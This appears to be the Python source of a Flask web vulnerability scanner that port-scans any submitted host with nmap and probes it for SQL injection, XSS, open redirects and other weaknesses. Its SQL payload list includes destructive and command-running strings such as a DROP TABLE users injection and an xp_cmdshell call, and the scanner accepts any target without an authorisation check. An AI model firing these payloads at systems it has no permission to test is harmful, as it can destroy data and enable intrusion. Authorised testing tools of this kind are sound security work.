from flask import Flask, render_template, request
from flask_sqlalchemy import SQLAlchemy
import nmap
import requests
import json
import os
import time

app = Flask(__name__)

# Database configuration
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///scan_results.db'  # Use SQLite for simplicity
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)

# Define a model for scan results
class ScanResult(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    target = db.Column(db.String(200), nullable=False)  # Combined field for IP or URL
    scan_type = db.Column(db.String(50), nullable=False)
    result = db.Column(db.Text, nullable=False)

# Create the database (run this once)
with app.app_context():
    db.create_all()

# Processing Module (Decorator)
def processing_module(func):
    """Decorator to show which function is being processed and measure time."""
    def wrapper(*args, **kwargs):
        start_time = time.time()
        print(f"Processing: {func.__name__}...")
        result = func(*args, **kwargs)
        end_time = time.time()
        print(f"Finished: {func.__name__} (Time: {end_time - start_time:.4f} seconds)")
        return result
    return wrapper

# Open Ports Check
@processing_module
def open_ports_check(target):
    nm = nmap.PortScanner()
    nm.scan(target, '1-1024')
    results = []
    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                results.append({"port": port, "state": nm[host][proto][port]['state']})
    return results

# SQL Injection Check
@processing_module
def sql_injection_check(target):
    # A comprehensive list of SQL injection payloads
    payloads = [
        # Basic SQL Injection
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "' OR '1'='1' #",
        "' OR '1'='1' AND 'x'='x' --",
        "' OR '1'='1' AND 'x'='x' /*",
        
        # Union-based SQL Injection
        "' UNION SELECT NULL, username, password FROM users --",
        "' UNION SELECT 1, 'a', 'b' --",
        "' UNION SELECT 1, 2, 3 --",
        "' UNION SELECT username, password FROM users --",
        
        # Error-based SQL Injection
        "' AND 1=CONVERT(int, (SELECT @@version)) --",
        "' AND 1=2 UNION SELECT NULL, NULL, NULL --",
        
        # Time-based Blind SQL Injection
        "'; WAITFOR DELAY '0:0:5' --",
        "'; IF (1=1) WAITFOR DELAY '0:0:5' --",
        
        # Boolean-based Blind SQL Injection
        "' AND '1'='1' --",
        "' AND '1'='2' --",
        
        # Other Techniques
        "'; DROP TABLE users; --",
        "'; EXEC xp_cmdshell('net user'); --",
        "'; SELECT * FROM information_schema.tables; --",
        "'; SELECT * FROM users WHERE 'a'='a'; --",
        "'; SELECT * FROM users WHERE username = 'admin' AND password = 'password'; --",
        "'; SELECT * FROM users WHERE username = 'admin' OR '1'='1'; --",
        "'; SELECT * FROM users WHERE username = 'admin' AND password = 'password' UNION SELECT NULL, NULL; --",
    ]
    
    results = []
    
    for payload in payloads:
        try:
            response = requests.get(f"http://{target}/search?q={payload}")
            if response.status_code == 200:
                if "error" in response.text.lower() or "sql" in response.text.lower():
                    results.append({"payload": payload, "vulnerable": True})
                else:
                    results.append({"payload": payload, "vulnerable": False})
        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "error": str(e)})
    
    return {"vulnerabilities": results}

# Search Local Exploit Database
@processing_module
def search_exploits(service):
    exploits_dir = "/usr/share/exploitdb/exploits/"
    exploits_found = []

    # Search through the exploits directory
    for root, dirs, files in os.walk(exploits_dir):
        for file in files:
            if file.endswith(".py") or file.endswith(".c") or file.endswith(".pl"):
                with open(os.path.join(root, file), 'r', errors='ignore') as f:
                    content = f.read()
                    if service.lower() in content.lower():
                        exploits_found.append(file)

    return {"exploits": exploits_found}

# WAF Detection
@processing_module
def waf_detection(target):
    try:
        response = requests.get(f"http://{target}")
        headers = response.headers
        waf_headers = ["Server", "X-Security", "X-WAF", "X-Content-Type-Options"]
        detected_waf = {header: headers.get(header) for header in waf_headers if header in headers}
        return {"waf_detected": bool(detected_waf), "details": detected_waf}
    except Exception as e:
        return {"error": str(e)}

# Subdomain Enumeration
@processing_module
def subdomain_enumeration(target):
    subdomains = []
    wordlist = ["www", "api", "dev", "test", "mail"]
    for sub in wordlist:
        subdomain = f"{sub}.{target}"
        try:
            response = requests.get(f"http://{subdomain}", timeout=2)
            if response.status_code == 200:
                subdomains.append(subdomain)
        except requests.exceptions.RequestException:
            continue
    return {"subdomains": subdomains}

# Security Headers Check
@processing_module
def security_headers_check(target):
    try:
        response = requests.get(f"http://{target}")
        headers = response.headers
        security_headers = ["Strict-Transport-Security", "Content-Security-Policy", "X-Content-Type-Options", "X-Frame-Options"]
        missing_headers = [header for header in security_headers if header not in headers]
        return {"missing_headers": missing_headers}
    except Exception as e:
        return {"error": str(e)}

# CMS Detection
@processing_module
def cms_detection(target):
    cms_found = []
    cms_list = {
        "WordPress": "/wp-admin",
        "Joomla": "/administrator",
        "Drupal": "/user/login"
    }
    for cms, path in cms_list.items():
        url = f"http://{target}{path}"
        try:
            response = requests.get(url, timeout=2)
            if response.status_code == 200:
                cms_found.append(cms)
        except requests.exceptions.RequestException:
            continue
    return {"cms_found": cms_found}

# XSS Check
@processing_module
def xss_check(target):
    payloads = ["<script>alert('XSS')</script>", "'><img src=x onerror=alert(1)>"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"http://{target}/search?q={payload}")
            if payload in response.text:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "error": str(e)})
    return {"xss_results": results}

# CSRF Check
@processing_module
def csrf_check(target):
    try:
        response = requests.get(f"http://{target}/form")
        csrf_token = None
        if "csrf" in response.text.lower():
            csrf_token = response.text.split("csrf")[1].split('"')[1]  # Simplified extraction
        return {"csrf_token_found": bool(csrf_token), "csrf_token": csrf_token}
    except Exception as e:
        return {"error": str(e)}

# SSL/TLS Certificate Check
@processing_module
def ssl_check(target):
    try:
        response = requests.get(f"https://{target}", timeout=5)
        return {"ssl_enabled": True, "status_code": response.status_code}
    except requests.exceptions.SSLError:
        return {"ssl_enabled": False}
    except requests.exceptions.RequestException as e:
        return {"error": str(e)}

# HTTP Methods Check
@processing_module
def http_methods_check(target):
    methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
    allowed_methods = []
    for method in methods:
        try:
            response = requests.request(method, f"http://{target}")
            if response.status_code < 400:
                allowed_methods.append(method)
        except requests.exceptions.RequestException:
            continue
    return {"allowed_methods": allowed_methods}

# Content Security Policy Check
@processing_module
def csp_check(target):
    try:
        response = requests.get(f"http://{target}")
        csp_header = response.headers.get("Content-Security-Policy", "Not Set")
        return {"csp_header": csp_header}
    except Exception as e:
        return {"error": str(e)}

# Open Redirect Check
@processing_module
def open_redirect_check(target):
    payloads = ["http://evil.com", "https://malicious.com"]
    results = []
    for payload in payloads:
        try:
            response = requests.get(f"http://{target}/redirect?url={payload}")
            if response.url == payload:
                results.append({"payload": payload, "vulnerable": True})
            else:
                results.append({"payload": payload, "vulnerable": False})
        except requests.exceptions.RequestException as e:
            results.append({"payload": payload, "error": str(e)})
    return {"open_redirects": results}

# Rate Limiting Check
@processing_module
def rate_limiting_check(target):
    try:
        for _ in range(10):  # Send multiple requests
            response = requests.get(f"http://{target}")
            if response.status_code == 429:  # Too Many Requests
                return {"rate_limiting": True}
        return {"rate_limiting": False}
    except Exception as e:
        return {"error": str(e)}

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/scan', methods=['POST'])
def scan():
    target = request.form['target']
    results = {
        "open_ports": open_ports_check(target),
        "sql_injection": sql_injection_check(target),
        "waf_detection": waf_detection(target),
        "subdomain_enumeration": subdomain_enumeration(target),
        "security_headers": security_headers_check(target),
        "cms_detection": cms_detection(target),
        "csrf_check": csrf_check(target),
        "ssl_check": ssl_check(target),
        "http_methods": http_methods_check(target),
        "csp_check": csp_check(target),
        "open_redirect": open_redirect_check(target),
        "rate_limiting": rate_limiting_check(target),
    }

    # Save results to the database
    scan_result = ScanResult(target=target, scan_type='Full Scan', result=json.dumps(results))
    db.session.add(scan_result)
    db.session.commit()

    return render_template('results.html', target=target, results=results)

if __name__ == '__main__':
    app.run(debug=True)
